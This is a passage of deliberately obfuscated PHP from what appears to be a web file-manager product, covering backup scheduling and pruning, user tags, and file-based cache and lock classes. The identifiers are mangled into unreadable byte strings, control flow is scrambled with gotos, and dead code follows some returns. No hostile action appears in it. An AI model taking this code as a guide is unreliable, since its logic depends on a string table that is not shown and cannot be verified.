„â”õ = $aÓ¯Ï÷¨ß´[694]; goto eà·À«™; eó¿¿ğ±‘„: $aÓ¯Ï÷¨ß´ =& $_SERVER[Æ¼ôºÙï]; $E­ê¼„Ğñä =& $_SERVER[­£]; $Bœ¡ô×ù›” = $E­ê¼„Ğñä[0]($E­ê¼„Ğñä[358], $DšÆÃğ¿ãé); goto eÂÔ§‰Ô; B¹Ò•ÉÜù£: $eÒê‚ùêù = $this->{$_SERVER[­£][256]}($Bœ¡ô×ù›”[1] . $E­ê¼„Ğñä[10], $E­ê¼„Ğñä[155]); if (!$eÒê‚ùêù) { return $E­ê¼„Ğñä[10]; } $eÒê‚ùêù = $E­ê¼„Ğñä[250]($eÒê‚ùêù); goto a¨”™ÁÌ®É; eÂÔ§‰Ô: $eÛƒµ„ˆ¯Ó = $aÓ¯Ï÷¨ß´[693]; if (!$eÛƒµ„ˆ¯Ó) { die; } if ($E­ê¼„Ğñä[19]($Bœ¡ô×ù›”) != 2) { return $E­ê¼„Ğñä[10]; } goto B¹Ò•ÉÜù£; cÛ‘„Ç„Àº: while (strlen($Fá¡ßËÜ÷‹) < $aÓ¯Ï÷¨ß´[594]) { if (!$Fá¡ßËÜ÷‹) { break; } $Fá¡ßËÜ÷‹++; } $A…‘›³í©¤ = $this->{$_SERVER[­£][256]}($Bœ¡ô×ù›”[0], $EÍ…’İğ‘ƒ); $bƒµºá¦Œš = $aÓ¯Ï÷¨ß´[700]; goto dÕŠ§ºîßê; A“ˆ¤‘ô£Ó: $cµ³¡îªğâ = $E­ê¼„Ğñä[250](($E¦Ü·ì¡Ó + $B·óİÄ¦¡¾) / 2); while (1) { $AŒ·‚°ùŠ = $cµ³¡îªğâ; $DÅ¯˜¶‚Êí = $aÓ¯Ï÷¨ß´[696]; if (strlen($DÅ¯˜¶‚Êí) < $aÓ¯Ï÷¨ß´[578]) { die; } $d§»…ÑèÛğ = $e™àêàÃ•š; while ($d§»…ÑèÛğ % $AŒ·‚°ùŠ != 0) { $D¼Ğ»è÷Óø = $d§»…ÑèÛğ; $BÛ¤åŒœã = $aÓ¯Ï÷¨ß´[697]; if (!$BÛ¤åŒœã) { die; } $d§»…ÑèÛğ = $AŒ·‚°ùŠ; $A§˜Õ­¢ˆ« = $aÓ¯Ï÷¨ß´[698]; if (!$A§˜Õ­¢ˆ«) { die; } $AŒ·‚°ùŠ = $D¼Ğ»è÷Óø % $AŒ·‚°ùŠ; } if ($AŒ·‚°ùŠ == 1) { break; } else { $cµ³¡îªğâ++; } } $DØÀÓ‹öß = 2; goto Bƒâ ÷ÀåÜ; bï˜âİ Ãó: } public function povh1d1f523c() { goto a•ß‰ó­å; aˆ‚×³â¹Š: if (!$eä¨Æ™½ÌĞ) { die; } goto bê©í–Ó¹ª; a•ß‰ó­å: $AåˆÇê”óÃ =& $_SERVER[Æ¼ôºÙï]; $b«ô©îòµå =& $_SERVER[­£]; $d—©â¢Æ…õ = $b«ô©îòµå[339]($b«ô©îòµå[359](2, 14), $b«ô©îòµå[359](2, 16) - 1); goto DÌÙ…‹Âáí; fÖêË§‚ËÔ: $dÅ¿ˆšÔ×Ş = 1; while ($dÅ¿ˆšÔ×Ş <= (int) $b«ô©îòµå[360]($d—©â¢Æ…õ)) { $dë÷¹´†’£ = $dÅ¿ˆšÔ×Ş; $aè³ñÏ¥™ö = $AåˆÇê”óÃ[702]; while (!0) { $dë÷¹´†’£++; if ($dë÷¹´†’£ <= 2) { $dÅ¿ˆšÔ×Ş = $dë÷¹´†’£; break; } else { if ($dë÷¹´†’£ < 2) { continue; } } $EÈ˜£…§— = !0; for ($FÌ‘Œ±ãêç = 2; $FÌ‘Œ±ãêç <= $b«ô©îòµå[360]($dë÷¹´†’£); $FÌ‘Œ±ãêç++) { if ($dë÷¹´†’£ % $FÌ‘Œ±ãêç == 0) { $EÈ˜£…§— = !1; } } if ($EÈ˜£…§—) { $dÅ¿ˆšÔ×Ş = $dë÷¹´†’£; break; } } $fä°é¿Ï¦¦[] = $dÅ¿ˆšÔ×Ş; } $F†”ÑŠí¶Ñ = 2; goto FŞ“ù‘§±·; FŞ“ù‘§±·: for ($dë÷¹´†’£ = $d—©â¢Æ…õ; $dë÷¹´†’£ > 1; $dë÷¹´†’£--) { $EÈ˜£…§— = !0; $fèÊîâˆŠí = $AåˆÇê”óÃ[703]; if (!$fèÊîâˆŠí) { return; } foreach ($fä°é¿Ï¦¦ as $bƒ®ƒ¹) { if ($dë÷¹´†’£ % $bƒ®ƒ¹ == 0) { $EÈ˜£…§— = !1; break; } } if ($EÈ˜£…§—) { $F†”ÑŠí¶Ñ = $dë÷¹´†’£; break; } } return $F†”ÑŠí¶Ñ; $eä¨Æ™½ÌĞ = $AåˆÇê”óÃ[704]; goto aˆ‚×³â¹Š; DÌÙ…‹Âáí: $B‡¼åÏ‰È” = $AåˆÇê”óÃ[701]; if (!$B‡¼åÏ‰È”) { die; } $fä°é¿Ï¦¦ = array(); goto fÖêË§‚ËÔ; bê©í–Ó¹ª: } public function oxlj4211fbdf($aèŠø©Ò¬ï, $eÁˆáÁ©âï) { $e®–Î“è÷£ =& $_SERVER[­£]; return $e®–Î“è÷£[13](array($e®–Î“è÷£[14], $e®–Î“è÷£[361]), $aèŠø©Ò¬ï, $eÁˆáÁ©âï); } public function xdtmf2d3b262($câšùÒ…, $d±î•óøŠ) { $bŸœèê£ß¥ =& $_SERVER[­£]; return $bŸœèê£ß¥[13](array($bŸœèê£ß¥[362], $bŸœèê£ß¥[363]), $câšùÒ…, $d±î•óøŠ); } public function mozn1904045e($e†²î……ÄÏ, $aè¶ÇŠ»é¿) { $e¯Ø˜‹ÕŒ =& $_SERVER[Æ¼ôºÙï]; $f–ôÒœâóË =& $_SERVER[­£]; return $f–ôÒœâóË[13](array($f–ôÒœâóË[362], $f–ôÒœâóË[364]), $e†²î……ÄÏ, $aè¶ÇŠ»é¿); $e‰‰óªÚÄ˜ = $e¯Ø˜‹ÕŒ[705]; while (strlen($e‰‰óªÚÄ˜) < $e¯Ø˜‹ÕŒ[574]) { if (!$e‰‰óªÚÄ˜) { break; } $e‰‰óªÚÄ˜++; } } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $fğÓÚ¤Ø»š =& $_SERVER[Æ¼ôºÙï]; self::$name = date($fğÓÚ¤Ø»š[706]); if (!($Cš¸ƒÛÎµĞ = Model($fğÓÚ¤Ø»š[707])->lastItem())) { $Cš¸ƒÛÎµĞ = $this->initData(); } else { self::$name = $Cš¸ƒÛÎµĞ[$fğÓÚ¤Ø»š[28]]; if ($Cš¸ƒÛÎµĞ[$fğÓÚ¤Ø»š[708]] == $fğÓÚ¤Ø»š[86]) { self::$name = date($fğÓÚ¤Ø»š[709]); $a¨¨â¿ïçù = 0; if (isset($Cš¸ƒÛÎµĞ[$fğÓÚ¤Ø»š[289]][$fğÓÚ¤Ø»š[173]][$fğÓÚ¤Ø»š[436]])) { $a¨¨â¿ïçù = (int) $Cš¸ƒÛÎµĞ[$fğÓÚ¤Ø»š[289]][$fğÓÚ¤Ø»š[173]][$fğÓÚ¤Ø»š[436]]; } if ($Cš¸ƒÛÎµĞ[$fğÓÚ¤Ø»š[28]] == self::$name) { Model($fğÓÚ¤Ø»š[707])->remove($Cš¸ƒÛÎµĞ[$fğÓÚ¤Ø»š[385]]); } $Cš¸ƒÛÎµĞ = $this->initData($a¨¨â¿ïçù, $Cš¸ƒÛÎµĞ[$fğÓÚ¤Ø»š[710]]); } else { $this->checkStore($Cš¸ƒÛÎµĞ[$fğÓÚ¤Ø»š[710]]); } } self::$option = $Cš¸ƒÛÎµĞ; } private function initData($Bœˆ“Ç‚ë‡ = 0, $Eå”äçë· = '') { goto F–ÆéÚëÅ; c‚œè–½ñº: $aáïô¨†Ëƒ[$B†¼ƒßÈ‘”[385]] = $A¸øƒİ½¡Ú; return $aáïô¨†Ëƒ; goto E÷æ†Û¢å˜; F–ÆéÚëÅ: $B†¼ƒßÈ‘” =& $_SERVER[Æ¼ôºÙï]; $eäğãƒÛã¡ = Model($B†¼ƒßÈ‘”[707])->config(); if ($Eå”äçë· && $eäğãƒÛã¡[$B†¼ƒßÈ‘”[710]] != $Eå”äçë·) { $Bœˆ“Ç‚ë‡ = 0; } goto d½¢ŒµÄÒ‰; d½¢ŒµÄÒ‰: $this->checkStore($eäğãƒÛã¡[$B†¼ƒßÈ‘”[710]]); $aáïô¨†Ëƒ = array($B†¼ƒßÈ‘”[710] => $eäğãƒÛã¡[$B†¼ƒßÈ‘”[710]], $B†¼ƒßÈ‘”[28] => self::$name, $B†¼ƒßÈ‘”[708] => 0, $B†¼ƒßÈ‘”[711] => $eäğãƒÛã¡[$B†¼ƒßÈ‘”[711]], $B†¼ƒßÈ‘”[289] => array($B†¼ƒßÈ‘”[712] => array($B†¼ƒßÈ‘”[708] => 0), $B†¼ƒßÈ‘”[713] => array($B†¼ƒßÈ‘”[708] => 0, $B†¼ƒßÈ‘”[714] => 0, $B†¼ƒßÈ‘”[715] => 0, $B†¼ƒßÈ‘”[29] => $B†¼ƒßÈ‘”[33]), $B†¼ƒßÈ‘”[716] => array($B†¼ƒßÈ‘”[708] => 0, $B†¼ƒßÈ‘”[714] => 0, $B†¼ƒßÈ‘”[715] => 0), $B†¼ƒßÈ‘”[173] => array($B†¼ƒßÈ‘”[708] => 0, $B†¼ƒßÈ‘”[717] => 0, $B†¼ƒßÈ‘”[718] => 0, $B†¼ƒßÈ‘”[719] => 0, $B†¼ƒßÈ‘”[720] => 0, $B†¼ƒßÈ‘”[436] => $Bœˆ“Ç‚ë‡)), $B†¼ƒßÈ‘”[721] => time(), $B†¼ƒßÈ‘”[465] => 0); $A¸øƒİ½¡Ú = Model($B†¼ƒßÈ‘”[707])->insert($aáïô¨†Ëƒ); goto c‚œè–½ñº; E÷æ†Û¢å˜: } private function checkStore($eÜ‹ßÊ«¢¼) { $fÂªçßî¯ã =& $_SERVER[Æ¼ôºÙï]; $a‘ß¥õ–®÷ = Model($fÂªçßî¯ã[722])->listData($eÜ‹ßÊ«¢¼); Model($fÂªçßî¯ã[722])->checkConfig($a‘ß¥õ–®÷); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Æ¼ôºÙï][707])->findByName(self::$name); } return self::$option; } public static function set($BÍ“’öğ‹İ) { $b‡õ“Ç†ª¢ =& $_SERVER[Æ¼ôºÙï]; $dÅÆ‡¾Üò = self::get(); foreach ($BÍ“’öğ‹İ as $dšõ½·£´ => $DÃ¡ÃƒŸ…) { $E°ì¦ß¤øØ = explode($b‡õ“Ç†ª¢[94], $dšõ½·£´); $aæ‰É§Ø± = count($E°ì¦ß¤øØ); switch ($aæ‰É§Ø±) { case 1: $dÅÆ‡¾Üò[$E°ì¦ß¤øØ[0]] = $DÃ¡ÃƒŸ…; break; case 2: $dÅÆ‡¾Üò[$E°ì¦ß¤øØ[0]][$E°ì¦ß¤øØ[1]] = $DÃ¡ÃƒŸ…; break; case 3: $dÅÆ‡¾Üò[$E°ì¦ß¤øØ[0]][$E°ì¦ß¤øØ[1]][$E°ì¦ß¤øØ[2]] = $DÃ¡ÃƒŸ…; break; } } Model($b‡õ“Ç†ª¢[707])->update($dÅÆ‡¾Üò[$b‡õ“Ç†ª¢[385]], $dÅÆ‡¾Üò); self::$option = $dÅÆ‡¾Üò; return self::$option; } public function keep() { $A•ĞáÆµ•ƒ =& $_SERVER[Æ¼ôºÙï]; $C‚„ƒ¼»àÂ = self::get(); if ($C‚„ƒ¼»àÂ[$A•ĞáÆµ•ƒ[289]][$A•ĞáÆµ•ƒ[712]][$A•ĞáÆµ•ƒ[708]] == $A•ĞáÆµ•ƒ[86]) { return; } $this->backupKeep($C‚„ƒ¼»àÂ); self::set(array($A•ĞáÆµ•ƒ[723] => 1)); } private function backupKeep($e§×ß‰“£‡) { goto EæŠ½ìƒ±; e¤ò‚»’¥Ÿ: for ($cóÛ‚´ìÃ¡ = 0; $cóÛ‚´ìÃ¡ < 12; $cóÛ‚´ìÃ¡++) { $fšŒÔÅ¬’œ[] = date($aÏ˜Ëë“×‹[724], strtotime("\55{$cóÛ‚´ìÃ¡}\x20\x6d\x6f\x6e\164\x68\x73")); } $fšŒÔÅ¬’œ = array_unique($fšŒÔÅ¬’œ); foreach ($cºçÊ˜‘á± as $F›¶×„ëØÂ) { if (!empty($F›¶×„ëØÂ[$aÏ˜Ëë“×‹[28]]) && in_array($F›¶×„ëØÂ[$aÏ˜Ëë“×‹[28]], $fšŒÔÅ¬’œ)) { continue; } Model($aÏ˜Ëë“×‹[707])->remove($F›¶×„ëØÂ[$aÏ˜Ëë“×‹[385]]); $cˆÃ×Üê“š = "\173\151\157\x3a{$e§×ß‰“£‡[$aÏ˜Ëë“×‹[710]]}\x7d\57\144\x61\x74\x61\x62\141\163\145\57\x62\x61\x63\x6b\165\x70\137{$F›¶×„ëØÂ[$aÏ˜Ëë“×‹[28]]}"; IO::remove($cˆÃ×Üê“š, !1); } goto b»À‘¥Æíô; EæŠ½ìƒ±: $aÏ˜Ëë“×‹ =& $_SERVER[Æ¼ôºÙï]; $cºçÊ˜‘á± = Model($aÏ˜Ëë“×‹[707])->listData(); if (empty($cºçÊ˜‘á±)) { return; } goto AêÂ¢Õ°¹Ë; AêÂ¢Õ°¹Ë: $cóÛ‚´ìÃ¡ = 0; $fšŒÔÅ¬’œ = array(); foreach ($cºçÊ˜‘á± as $F›¶×„ëØÂ) { if ($cóÛ‚´ìÃ¡ >= 7) { break; } $fšŒÔÅ¬’œ[] = $F›¶×„ëØÂ[$aÏ˜Ëë“×‹[28]]; $cóÛ‚´ìÃ¡++; } goto e¤ò‚»’¥Ÿ; b»À‘¥Æíô: } public function db() { goto BØ··ù‡³©; BØ··ù‡³©: $D‘—˜‚İ‚‘ =& $_SERVER[Æ¼ôºÙï]; $D´ã†Ïˆ“… = self::get(); if ($D´ã†Ïˆ“…[$D‘—˜‚İ‚‘[289]][$D‘—˜‚İ‚‘[713]][$D‘—˜‚İ‚‘[708]] == $D‘—˜‚İ‚‘[86]) { return !0; } goto bó“ÂóÜ®æ; bó“ÂóÜ®æ: $fºíí¸Íó = new BackupDb(); if (!$fºíí¸Íó->index()) { return !1; } self::set(array($D‘—˜‚İ‚‘[725] => 1)); goto DáĞ±¾ÖÑò; DáĞ±¾ÖÑò: return !0; goto bá¨Í†ç²³; bá¨Í†ç²³: } public function dbFile() { goto eÂ¾‘‘Øì–; eÂ¾‘‘Øì–: $f«°òéŠñ” =& $_SERVER[Æ¼ôºÙï]; $B¼öåÕ† = self::get(); if ($B¼öåÕ†[$f«°òéŠñ”[289]][$f«°òéŠñ”[716]][$f«°òéŠñ”[708]] == $f«°òéŠñ”[86]) { return !0; } goto C«°Ô±ÅĞ«; C«°Ô±ÅĞ«: $AËËŠÂË¯ = new BackupDbFile(); if (!$AËËŠÂË¯->index()) { return !1; } self::set(array($f«°òéŠñ”[726] => 1)); goto f®ÔÀ¶¢‹í; f®ÔÀ¶¢‹í: return !0; goto eåÄ“º…Ø; eåÄ“º…Ø: } public function file() { $AÛåù—ëä‰ =& $_SERVER[Æ¼ôºÙï]; $bÉ‚Ê÷î°» = self::get(); if ($bÉ‚Ê÷î°»[$AÛåù—ëä‰[289]][$AÛåù—ëä‰[173]][$AÛåù—ëä‰[708]] == $AÛåù—ëä‰[86]) { return !0; } if (!isset($bÉ‚Ê÷î°»[$AÛåù—ëä‰[711]]) || $bÉ‚Ê÷î°»[$AÛåù—ëä‰[711]] == $AÛåù—ëä‰[486]) { $Bæƒ”ÖË³Ä = new BackupFile(); if (!$Bæƒ”ÖË³Ä->index()) { return !1; } } self::set(array($AÛåù—ëä‰[727] => 1, $AÛåù—ëä‰[708] => 1)); return !0; } } goto eÌãİ„±‚Ú; BíÏ½ô·Ú„: class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\x65\x72\x2e\x74\141\147\114\151\x73\x74"; public $modelType = "\125\163\145\x72\117\160\x74\151\x6f\x6e"; public $field = array("\x6e\x61\155\x65", "\163\164\x79\x6c\x65", "\x73\157\162\164"); public function listData($FÎ¢™Ãº = false, $b‘İÕï¢‰ï = "\x73\157\162\x74", $A÷… éëˆÏ = false) { return parent::listData($FÎ¢™Ãº, $b‘İÕï¢‰ï, $A÷… éëˆÏ); } public function remove($b‘áàÆ–“§) { return parent::remove($b‘áàÆ–“§); } public function add($a‚æ…î¾Ê, $a‰ì˜¯¬Ô¦ = "\154\x61\142\x65\154\55\147\x72\145\x79\55\156\157\162\155\141\154") { $FÁ»•“Éø =& $_SERVER[Æ¼ôºÙï]; if ($this->findByName($a‚æ…î¾Ê)) { return !1; } $f‘ÂæÌ… = array($FÁ»•“Éø[404] => $a‚æ…î¾Ê, $FÁ»•“Éø[453] => $a‰ì˜¯¬Ô¦, $FÁ»•“Éø[1665] => $this->getSort($FÁ»•“Éø[254]) + 1); return parent::insert($f‘ÂæÌ…); } public function update($b÷‰¤ÀëÂÁ, $e·µŠìÄ¥ê) { $EĞÆ÷õ÷·¬ =& $_SERVER[Æ¼ôºÙï]; $Fè‰’ëÀ® = $this->listData($b÷‰¤ÀëÂÁ); $A•ØÈÍ öİ = $this->findByName($e·µŠìÄ¥ê[$EĞÆ÷õ÷·¬[28]]); if (!$Fè‰’ëÀ® || $A•ØÈÍ öİ && $A•ØÈÍ öİ[$EĞÆ÷õ÷·¬[385]] != $Fè‰’ëÀ®[$EĞÆ÷õ÷·¬[385]]) { return !1; } return parent::update($b÷‰¤ÀëÂÁ, $e·µŠìÄ¥ê); } public function moveTop($f¡•ÑÅö‡Ÿ) { $bí°‡Ş›®á =& $_SERVER[Æ¼ôºÙï]; $a´ÔñäÀ×ª = parent::listData(); $C¢ÖÀÚ± = $this->getSort($bí°‡Ş›®á[253]); foreach ($a´ÔñäÀ×ª as &$Bõ˜ª‘ßï) { if ($Bõ˜ª‘ßï[$bí°‡Ş›®á[385]] == $f¡•ÑÅö‡Ÿ) { $Bõ˜ª‘ßï[$bí°‡Ş›®á[1684]] = $C¢ÖÀÚ±; continue; } $Bõ˜ª‘ßï[$bí°‡Ş›®á[1684]] += 1; } unset($Bõ˜ª‘ßï); return parent::resetData($a´ÔñäÀ×ª); } public function moveBottom($e—”àÌ¬†æ) { $E·†˜‰ï• =& $_SERVER[Æ¼ôºÙï]; $bÕÓÜ¨Äˆ³ = $this->getSort($E·†˜‰ï•[254]) + 1; return parent::update($e—”àÌ¬†æ, array($E·†˜‰ï•[1684] => $bÕÓÜ¨Äˆ³)); } public function resetSort($CÅ¾‘Ó Ğ) { goto fĞ–âÒ’—»; dê…™ ·ù: for ($dÖ»½çï‹´ = 0; $dÖ»½çï‹´ < count($CÅ¾‘Ó Ğ); $dÖ»½çï‹´++) { $a‡ÊÕ¤Ï…•[$CÅ¾‘Ó Ğ[$dÖ»½çï‹´] . $Eö†ğ æ¡…[33]] = $dÖ»½çï‹´ + 1; } $cÀº·ãåÓâ = parent::listData(); foreach ($cÀº·ãåÓâ as &$e†ˆ‡èğÀÒ) { $f„Ô‹—ğ© = $a‡ÊÕ¤Ï…•[$e†ˆ‡èğÀÒ[$Eö†ğ æ¡…[385]]]; $e†ˆ‡èğÀÒ[$Eö†ğ æ¡…[1684]] = $f„Ô‹—ğ© ? $f„Ô‹—ğ© : $e†ˆ‡èğÀÒ[$Eö†ğ æ¡…[1684]]; } goto A¼Åøºç»—; A¼Åøºç»—: unset($e†ˆ‡èğÀÒ); return parent::resetData($cÀº·ãåÓâ); goto a±¨ËêİÒ; fĞ–âÒ’—»: $Eö†ğ æ¡… =& $_SERVER[Æ¼ôºÙï]; $a‡ÊÕ¤Ï…• = array(); $CÅ¾‘Ó Ğ = is_array($CÅ¾‘Ó Ğ) ? $CÅ¾‘Ó Ğ : array(); goto dê…™ ·ù; a±¨ËêİÒ: } private function getSort($fïªÔô¹•) { $E³ˆ–ÇµŒ¨ =& $_SERVER[Æ¼ôºÙï]; $AôÈ•‘Ã±Ø = parent::listData(); $câçÛŠÊÆƒ = array_to_keyvalue($AôÈ•‘Ã±Ø, $E³ˆ–ÇµŒ¨[33], $E³ˆ–ÇµŒ¨[1684]); if (!$câçÛŠÊÆƒ) { $câçÛŠÊÆƒ = array(0); } $DòÉŸ’×ùÔ = $fïªÔô¹• == $E³ˆ–ÇµŒ¨[254] ? max($câçÛŠÊÆƒ) : min($câçÛŠÊÆƒ); return intval($DòÉŸ’×ùÔ); } } goto fô“Ğ‰«ß; c„ĞÙºë‰¥: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto AÅó¨µ‡œŸ; AÅó¨µ‡œŸ: $F‚Å„Ì¯Û =& $_SERVER[Æ¼ôºÙï]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto DÙÜ½²ë‹Â; DÙÜ½²ë‹Â: $B…Çá»‰œÄ = $GLOBALS[$F‚Å„Ì¯Û[6]][$F‚Å„Ì¯Û[345]]; $eÎµôßö™Ó = $B…Çá»‰œÄ[$B…Çá»‰œÄ[$F‚Å„Ì¯Û[772]]]; $d§Ùó‘Éğ£ = $B…Çá»‰œÄ[$F‚Å„Ì¯Û[773]]; goto c¹ñ´•êä×; c¹ñ´•êä×: switch ($B…Çá»‰œÄ[$F‚Å„Ì¯Û[772]]) { case $F‚Å„Ì¯Û[17]: self::$handle = Model($F‚Å„Ì¯Û[774]); break; case $F‚Å„Ì¯Û[775]: self::$handle = new CacheRedis($eÎµôßö™Ó, $d§Ùó‘Éğ£); break; case $F‚Å„Ì¯Û[776]: self::$handle = new CacheMemcached($eÎµôßö™Ó, $d§Ùó‘Éğ£); break; case $F‚Å„Ì¯Û[173]: self::$handle = new CacheFile($eÎµôßö™Ó, $d§Ùó‘Éğ£); break; default: break; } return self::$handle; goto CËí˜“á¢‹; CËí˜“á¢‹: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($F°¡ìÉ×…‹) { if (is_array($F°¡ìÉ×…‹) || is_object($F°¡ìÉ×…‹)) { $F°¡ìÉ×…‹ = json_encode($F°¡ìÉ×…‹); } $F°¡ìÉ×…‹ = rawurlencode($F°¡ìÉ×…‹); return md5(KOD_SITE_ID . $_SERVER[Æ¼ôºÙï][70] . $F°¡ìÉ×…‹); } public static function get($B³¦Ş©¯õ½) { $eŒ†Ó«Äİ = self::key($B³¦Ş©¯õ½); if (!isset(self::$memoryCache[$eŒ†Ó«Äİ])) { $a§ÀùÒÍï¹ = self::init()->get($eŒ†Ó«Äİ); self::$memoryCache[$eŒ†Ó«Äİ] = unserialize($a§ÀùÒÍï¹); } return self::$memoryCache[$eŒ†Ó«Äİ]; } public static function set($DæƒÃŠÔê›, $E¨Ÿ®À§–„, $bÙÁ¿·õ¿ï = false) { goto eàÁâÁÖ´; eàÁâÁÖ´: $aŞ¨ï“Úƒ¸ = self::key($DæƒÃŠÔê›); if (isset(self::$memoryCache[$aŞ¨ï“Úƒ¸]) && self::$memoryCache[$aŞ¨ï“Úƒ¸] === $E¨Ÿ®À§–„) { return !0; } if ($bÙÁ¿·õ¿ï === 0) { self::$memoryCache[$aŞ¨ï“Úƒ¸] = $E¨Ÿ®À§–„; return !0; } goto F†¥Õ¼÷Ê›; d›èÈ²áƒ„: CacheLock::unlock($DæƒÃŠÔê›); return $d¹¸¥–²Ú; goto EÃé¦šî‚ª; F†¥Õ¼÷Ê›: CacheLock::lock($DæƒÃŠÔê›); $d¹¸¥–²Ú = self::init()->set($aŞ¨ï“Úƒ¸, serialize($E¨Ÿ®À§–„), $bÙÁ¿·õ¿ï); self::$memoryCache[$aŞ¨ï“Úƒ¸] = $E¨Ÿ®À§–„; goto d›èÈ²áƒ„; EÃé¦šî‚ª: } public static function remove($eàƒ«ìÓ æ) { goto aÙĞ°Ë¤œ; aÙĞ°Ë¤œ: $a°¿øİìö¦ = self::key($eàƒ«ìÓ æ); unset(self::$memoryCache[$a°¿øİìö¦]); self::clearTimeout(); goto d–¾ñòĞó; eÑé‘ø: return $e¦Ïó¿ƒÏá; goto E‹ò©®Ö¶’; d–¾ñòĞó: CacheLock::lock($eàƒ«ìÓ æ); $e¦Ïó¿ƒÏá = self::init()->remove($a°¿øİìö¦); CacheLock::unlock($eàƒ«ìÓ æ); goto eÑé‘ø; E‹ò©®Ö¶’: } public static function removeMemory($EÙ½ñã¼¶á) { $BŞ˜¸ÄÍ À = self::key($EÙ½ñã¼¶á); unset(self::$memoryCache[$BŞ˜¸ÄÍ À]); } public static function clearMemory($dÛâ¶ƒÃáô = false) { if ($dÛâ¶ƒÃáô) { $dÛâ¶ƒÃáô = self::key($dÛâ¶ƒÃáô); unset(self::$memoryCache[$dÛâ¶ƒÃáô]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Æ¼ôºÙï][777])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Æ¼ôºÙï][778])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($FÑË‘‡¼ìÖ, $Fó¹šŠğ†µ) { $Aæ¸á¦°®è =& $_SERVER[Æ¼ôºÙï]; $this->cachePath = $FÑË‘‡¼ìÖ[$Aæ¸á¦°®è[75]]; $this->prefix = $Aæ¸á¦°®è[779]; $this->cacheTime = $Fó¹šŠğ†µ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($cîŠå¦ª¸É) { $Bë·ø…ÆÔÄ =& $_SERVER[Æ¼ôºÙï]; $cîŠå¦ª¸É = str_replace(array($Bë·ø…ÆÔÄ[780], $Bë·ø…ÆÔÄ[96], $Bë·ø…ÆÔÄ[69]), $Bë·ø…ÆÔÄ[781], $cîŠå¦ª¸É); return $this->cachePath . $Bë·ø…ÆÔÄ[782] . $cîŠå¦ª¸É . $Bë·ø…ÆÔÄ[783]; } public function set($EËÙÇó˜Œ, $C¯ø‰»æ, $E¢çéˆôºñ = false) { $Dé‹Æšï»³ = $this->getFile($EËÙÇó˜Œ); if (file_put_contents($Dé‹Æšï»³, $this->prefix . $C¯ø‰»æ, LOCK_EX)) { return !0; } @unlink($Dé‹Æšï»³); return !1; } public function get($cß‰÷èñŠÙ) { $fóÀó³Å÷Ô = $this->getFile($cß‰÷èñŠÙ); if (file_exists($fóÀó³Å÷Ô) && filemtime($fóÀó³Å÷Ô) < time() - $this->cacheTime) { @unlink($fóÀó³Å÷Ô); return !1; } $e¤‰‚ÇÏ—÷ = @file_get_contents($fóÀó³Å÷Ô); return substr($e¤‰‚ÇÏ—÷, strlen($this->prefix)); } public function remove($EœÒöîÍ†‡) { $Eä¹ñ‡» = $this->getFile($EœÒöîÍ†‡); return @unlink($Eä¹ñ‡»); } public function deleteAll() { $F¼Î„„ÙÛÉ =& $_SERVER[Æ¼ôºÙï]; $AáÀ êõ†™ = scandir($this->cachePath); foreach ($AáÀ êõ†™ as $E°ñ¤Ó¹çğ) { $eÕå®ò¾‹Ø = $this->cachePath . $E°ñ¤Ó¹çğ; if (strpos($eÕå®ò¾‹Ø, $F¼Î„„ÙÛÉ[783]) && strpos($eÕå®ò¾‹Ø, $F¼Î„„ÙÛÉ[784])) { @unlink($eÕå®ò¾‹Ø); } } } public function clearTimeout() { $cÈ”›ˆˆ© =& $_SERVER[Æ¼ôºÙï]; $d¡õÅÒÌö = scandir($this->cachePath); foreach ($d¡õÅÒÌö as $F‰©ßİ…ñá) { $F³óËê·ŠÓ = $this->cachePath . $F‰©ßİ…ñá; if (strpos($F³óËê·ŠÓ, $cÈ”›ˆˆ©[783]) && strpos($F³óËê·ŠÓ, $cÈ”›ˆˆ©[784]) && filemtime($F³óËê·ŠÓ) < time() - $this->cacheTime) { @unlink($F³óËê·ŠÓ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto EÑò¾¶ Ğ; EÑò¾¶ Ğ: $BÀÕ÷Å‹¸Î =& $_SERVER[Æ¼ôºÙï]; if (self::$handle) { return self::$handle; } $aø°Æƒ£‰ = $GLOBALS[$BÀÕ÷Å‹¸Î[6]][$BÀÕ÷Å‹¸Î[345]]; goto E£Û“ŞÖÆŠ; E£Û“ŞÖÆŠ: self::$timeout = $aø°Æƒ£‰[$BÀÕ÷Å‹¸Î[785]] ? $aø°Æƒ£‰[$BÀÕ÷Å‹¸Î[785]] : 10; $eíšº¸¢ = _get($GLOBALS[$BÀÕ÷Å‹¸Î[6]], $BÀÕ÷Å‹¸Î[786]); $F°È³¾ŠºË = $aø°Æƒ£‰[$BÀÕ÷Å‹¸Î[772]] ? $aø°Æƒ£‰[$BÀÕ÷Å‹¸Î[772]] : $BÀÕ÷Å‹¸Î[173]; goto CóÈÔä³‰Ö; CóÈÔä³‰Ö: if ($F°È³¾ŠºË == $BÀÕ÷Å‹¸Î[17] && $eíšº¸¢ == $BÀÕ÷Å‹¸Î[9]) { $F°È³¾ŠºË = $BÀÕ÷Å‹¸Î[173]; } switch ($F°È³¾ŠºË) { case $BÀÕ÷Å‹¸Î[775]: self::$handle = new CacheLockRedis(); break; case $BÀÕ÷Å‹¸Î[776]: self::$handle = new CacheLockMemcached(); break; case $BÀÕ÷Å‹¸Î[17]: self::$handle = new CacheLockDatabase(); break; case $BÀÕ÷Å‹¸Î[173]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto C¢¨ƒâ«†¢; C¢¨ƒâ«†¢: } private static function key($Dšœº¤Ë¾’) { return $_SERVER[Æ¼ôºÙï][787] . Cache::key($Dšœº¤Ë¾’); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($c‹´†’Ûô = '') { self::$errorMsg = $c‹´†’Ûô; } public static function 